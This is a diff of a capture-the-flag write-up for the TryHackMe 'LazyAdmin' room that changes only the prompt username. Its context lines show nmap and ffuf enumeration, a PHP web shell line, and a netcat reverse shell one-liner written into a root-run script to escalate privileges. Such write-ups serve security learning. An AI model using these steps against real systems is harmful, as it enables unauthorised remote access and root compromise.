@@ -28,7 +28,7 @@ rights for thats so putting reverse shell we will get root.
 ### Enumeration
 
 ```bash
-┌─[argenestel@parrot]─[~/Desktop/lazyadmin]
+┌─[root@parrot]─[~/Desktop/lazyadmin]
 └──╼ $nmap -sC -sV -oA nmap/lazy 10.10.232.150
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 03:48 IST
 Nmap scan report for 10.10.232.150
@@ -57,7 +57,7 @@ So we can see few links after the Webpage loaded.
 Moving on to dirbust.
 
 ```bash
-┌─[✗]─[argenestel@parrot]─[~/Desktop/lazyadmin]
+┌─[✗]─[root@parrot]─[~/Desktop/lazyadmin]
 └──╼ $ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.232.150/FUZZ
 
         /'___\  /'___\           /'___\      
@@ -89,7 +89,7 @@ server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
 Dirbusting content again.
 
 ```bash
-┌─[argenestel@parrot]─[~/Desktop/lazyadmin]
+┌─[root@parrot]─[~/Desktop/lazyadmin]
 └──╼ $ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.232.150/content/FUZZ
 
         /'___\  /'___\           /'___\      
@@ -174,7 +174,7 @@ system($_GET['cmd']);
 let's get a reverse shell
 
 ```bash
-┌─[argenestel@parrot]─[~/Desktop/tryhackme/lazyadmin]
+┌─[root@parrot]─[~/Desktop/tryhackme/lazyadmin]
 └──╼ $pwncat --listen --port 4444
 [11:07:07] received connection from 10.10.182.220:46374                                                                connect.py:148
 [11:07:08] new host w/ hash 0a307a4f181fea16ebb4d9fe234f3689                                                            victim.py:325
@@ -199,7 +199,7 @@ www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
 www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.108.114 4443 >/tmp/f" > /etc/copy.sh
 
-┌─[argenestel@parrot]─[~/Desktop/tryhackme/lazyadmin]
+┌─[root@parrot]─[~/Desktop/tryhackme/lazyadmin]
 └──╼ $pwncat --listen --port 4443
 [11:36:23] received connection from 10.10.182.220:42902                                          connect.py:148
 [11:36:26] new host w/ hash 0a307a4f181fea16ebb4d9fe234f3689                                      victim.py:325
